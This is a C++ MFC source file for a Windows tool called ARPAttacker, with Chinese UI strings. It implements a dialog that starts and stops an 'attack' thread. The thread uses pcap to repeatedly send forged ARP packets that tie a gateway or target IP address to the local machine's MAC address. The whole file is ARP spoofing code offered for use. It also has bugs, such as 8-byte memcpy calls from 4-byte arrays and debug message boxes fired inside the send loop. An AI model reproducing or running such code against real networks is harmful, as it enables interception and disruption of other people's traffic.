// ARPAttackerCheatDlg.cpp : implementation file
//

#include "stdafx.h"
#include "ARPAttacker.h"
#include "ARPAttackerCheatDlg.h"
#include "arpPacket.h"


string strSelDeviceNameCheat="";
BOOL cStartFlag;
BOOL cKillFlag;
int cInterval;
BYTE cGate[4];
BYTE cTarget[4];
int bMode;
unsigned char* bLocalMacCheat;
unsigned _int64 bLocalIpCheat;

UINT SendArpCheatPacket(LPVOID mainClass);
// CARPAttackerCheatDlg dialog

IMPLEMENT_DYNAMIC(CARPAttackerCheatDlg, CDialog)

CARPAttackerCheatDlg::CARPAttackerCheatDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CARPAttackerCheatDlg::IDD, pParent)
	, m_interval(0)
	, m_mode(0)
{

}

CARPAttackerCheatDlg::~CARPAttackerCheatDlg()
{
}

void CARPAttackerCheatDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT_INTERVAL, m_interval);
	DDV_MinMaxInt(pDX, m_interval, 1, 60000);
	DDX_Control(pDX, IDC_IPADDRESS1, m_GateIP);
	DDX_Radio(pDX, IDC_RADIO1, m_mode);
}


BEGIN_MESSAGE_MAP(CARPAttackerCheatDlg, CDialog)
	ON_BN_CLICKED(IDOK, &CARPAttackerCheatDlg::OnBnClickedOk)
	ON_BN_CLICKED(IDCANCEL, &CARPAttackerCheatDlg::OnBnClickedCancel)
END_MESSAGE_MAP()


// CARPAttackerCheatDlg message handlers

BOOL CARPAttackerCheatDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  Add extra initialization here
	m_interval=1000;
	GetDlgItem(IDC_STATIC_TIP)->SetWindowText(m_targetIP);
	sscanf(m_targetIP,"%d.%d.%d.%d",&cGate[0],&cGate[1],&cGate[2],&cGate[3]);
	cTarget[0]=cGate[0];
	cTarget[1]=cGate[1];
	cTarget[2]=cGate[2];
	cTarget[3]=cGate[3];
	m_GateIP.SetAddress(cGate[0],cGate[1],cGate[2],1);
	cStartFlag=0;
	cKillFlag=0;
	m_mode=0;
	UpdateData(FALSE);


	return TRUE;  // return TRUE unless you set the focus to a control
	// EXCEPTION: OCX Property Pages should return FALSE
}

//开始、停止攻击按钮
void CARPAttackerCheatDlg::OnBnClickedOk()
{
	UpdateData(TRUE);
	if(cStartFlag==0){
		strSelDeviceNameCheat=m_SelDeviceName;
		cInterval=m_interval;
		bLocalIpCheat=m_localIp;
		bLocalMacCheat=m_localMac;
		m_GateIP.GetAddress(cGate[0],cGate[1],cGate[2],cGate[3]);
		bMode=m_mode;

		GetDlgItem(IDCANCEL)->EnableWindow(FALSE);
		GetDlgItem(IDOK)->SetWindowTextA("停止攻击");
		GetDlgItem(IDC_STATIC_STATUS2)->SetWindowTextA("状态:正在攻击");
		AfxBeginThread(SendArpCheatPacket, this);
		cStartFlag=1;
	}
	else{
		cKillFlag=1;
		cStartFlag=0;
		GetDlgItem(IDOK)->SetWindowTextA("开始攻击");
		GetDlgItem(IDC_STATIC_STATUS2)->SetWindowTextA("状态:已停止");
		GetDlgItem(IDCANCEL)->EnableWindow(TRUE);
		//PostThreadMessage(m_nThreadID, WM_QUIT,0,0);
	}

}

UINT SendArpCheatPacket(LPVOID mainClass)
{
	const char* pDevName = strSelDeviceNameCheat.c_str();
	char errbuf[PCAP_ERRBUF_SIZE + 1]; 
	pcap_t* pAdaptHandle;
	if((pAdaptHandle = pcap_open_live(pDevName, 60, 0, 100, errbuf)) == NULL)
	{	
		MessageBox(NULL, "无法打开适配器，可能与之不兼容!", "wait", MB_OK);
		return -1;
	}
	//AfxMessageBox(strSelDeviceNameFlood.c_str());
	//构造并发送泛洪包
	while(1){

		unsigned _int64 gateIp;
		memcpy(&gateIp,cGate,8);


		unsigned long targetIp;
		//cTarget[3]=68;
		memcpy(&targetIp,cTarget,8);
	
		unsigned char broadcastMac[6];
		for(int i=0;i<6;i++){
			broadcastMac[i]=0xff;
		}

		

	
		
		unsigned char randMac[6];
		for(int i=0;i<6;i++){
			srand((unsigned) time(NULL) + i);
			randMac[i]=rand() % 256;
		}
	
		unsigned char* arp_packet_for_rpl;
		if(bMode==0){
			AfxMessageBox("0");
			arp_packet_for_rpl = BuildArpRequestPacket(broadcastMac,bLocalMacCheat,targetIp,gateIp ,60);
		}
		else if(bMode==1){
			AfxMessageBox("1");
			arp_packet_for_rpl = BuildArpRequestPacket(broadcastMac,bLocalMacCheat, gateIp,targetIp, 60);	
		}
		pcap_sendpacket(pAdaptHandle, arp_packet_for_rpl, 60);
		Sleep(cInterval);
		//netNo++;
		//if(netNo==255)netNo=1;
		if(cKillFlag==1){
			break;
		}
	}
	cKillFlag=0;
	pcap_close(pAdaptHandle);
	
	
	return 0;
}


void CARPAttackerCheatDlg::OnBnClickedCancel()
{
	// TODO: Add your control notification handler code here
	OnCancel();
}
